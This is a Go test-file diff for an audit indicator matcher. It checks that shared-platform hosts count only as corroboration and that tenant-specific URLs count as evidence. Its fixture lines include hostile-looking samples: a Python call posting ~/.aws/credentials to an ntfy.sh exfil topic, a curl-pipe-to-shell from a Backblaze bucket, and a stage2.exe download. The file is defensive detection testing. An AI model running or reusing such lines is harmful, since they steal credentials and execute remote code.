@@ -82,3 +82,44 @@ func TestAuditVerifiedMalwareLinesStillMatch(t *testing.T) {
 		}
 	}
 }
+
+// A bare host or front-end address of a multi-tenant platform cannot name a tenant, so the hit
+// is corroboration only. Lines are from withdrawn audit records.
+func TestAuditSharedHostHitsAreContext(t *testing.T) {
+	m := auditMatcher("www.dropbox.com", "f005.backblazeb2.com", "ntfy.sh", "76.76.21.21",
+		"140.82.121.4", "185.199.108.153")
+	for _, line := range []string{
+		`url "https://www.dropbox.com/download?build=#{version}&plat=mac&rtoken=&type=full&arch=arm64"`,
+		`url "https://f005.backblazeb2.com/file/screenmemory/ScreenMemory.#{version}.dmg"`,
+		`homepage "https://ntfy.sh/"`,
+		`content: '76.76.21.21',`,
+		`assert (status, records) == ("NOERROR", ["140.82.121.4"])`,
+		`"resolved_hosts": ["185.199.108.153"],`,
+	} {
+		ev := m.MatchText("pkg/src/main.go", line)
+		if len(ev) == 0 {
+			t.Errorf("shared-host hit must still be recorded as corroboration: %s", line)
+		}
+		if got := evidenceLines(ev); len(got) != 0 {
+			t.Errorf("shared-host hit must not be evidence: %s", line)
+		}
+	}
+}
+
+// A url indicator on a shared platform names one tenant's payload and keeps full weight, and a
+// tenant-named host on the same provider is not shared.
+func TestAuditSharedHostURLAndTenantHostsStillMatch(t *testing.T) {
+	m := auditMatcher("https://www.dropbox.com/scl/fi/abc123/stage2.exe?dl=1",
+		"https://ntfy.sh/exfil-topic-9f2", "evilbucket.s3.us-west-004.backblazeb2.com",
+		"rocket-sense.duckdns.org")
+	for _, line := range []string{
+		`urllib.request.urlopen("https://www.dropbox.com/scl/fi/abc123/stage2.exe?dl=1")`,
+		`requests.post("https://ntfy.sh/exfil-topic-9f2", data=open(os.path.expanduser("~/.aws/credentials")).read())`,
+		`curl -fsSL https://evilbucket.s3.us-west-004.backblazeb2.com/x.sh | sh`,
+		`url: Url::parse("https://rocket-sense.duckdns.org/api/v1")`,
+	} {
+		if got := evidenceLines(m.MatchText("pkg/setup.py", line)); len(got) != 1 {
+			t.Errorf("tenant-specific indicator lost its evidence: %s", line)
+		}
+	}
+}
